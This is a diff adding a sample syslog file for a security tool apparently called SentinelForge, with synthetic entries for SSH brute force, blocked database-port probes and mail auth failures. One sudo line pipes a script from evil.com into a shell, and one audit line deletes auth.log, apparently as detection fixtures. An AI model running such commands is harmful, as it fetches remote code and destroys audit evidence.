@@ -1,0 +1,16 @@
+# SentinelForge sample syslog data — RFC 5424 and RFC 3164 formats
+<134>1 2026-02-23T08:15:30.123Z firewall01 sshd 12345 - - Failed password for admin from 198.51.100.23 port 22 ssh2
+<134>1 2026-02-23T08:15:31.456Z firewall01 sshd 12345 - - Failed password for admin from 198.51.100.23 port 22 ssh2
+<134>1 2026-02-23T08:15:32.789Z firewall01 sshd 12345 - - Failed password for admin from 198.51.100.23 port 22 ssh2
+<134>1 2026-02-23T08:15:33.012Z firewall01 sshd 12345 - - Failed password for root from 198.51.100.23 port 22 ssh2
+<134>1 2026-02-23T08:15:34.345Z firewall01 sshd 12345 - - Failed password for root from 198.51.100.23 port 22 ssh2
+<134>1 2026-02-23T08:15:35.678Z firewall01 sshd 12345 - - Failed password for deploy from 198.51.100.23 port 22 ssh2
+<134>1 2026-02-23T08:16:00.000Z firewall01 sshd 12345 - - Accepted password for admin from 198.51.100.23 port 22 ssh2
+<38>Feb 23 08:20:00 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.2.100 LEN=44 PROTO=TCP SPT=54321 DPT=3306 SYN
+<38>Feb 23 08:20:01 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.2.100 LEN=44 PROTO=TCP SPT=54322 DPT=1433 SYN
+<38>Feb 23 08:20:02 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.0.2.100 LEN=44 PROTO=TCP SPT=54323 DPT=5432 SYN
+<86>1 2026-02-23T08:25:00Z dc01 sshd 5678 - - Accepted publickey for deploy from 10.0.1.25 port 48001 ssh2
+Jan 23 08:30:00 server02 CRON[9876]: (root) CMD (/usr/local/bin/backup.sh)
+<134>1 2026-02-23T08:35:00Z host01 sudo 1111 - - admin1 : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://evil.com/payload.sh | sh
+<134>1 2026-02-23T08:40:00Z host01 audit 2222 - - User admin1 cleared auth.log: rm -rf /var/log/auth.log
+<134>1 2026-02-23T09:00:00Z mail01 postfix 3333 - - warning: 203.0.113.66: SASL LOGIN authentication failed
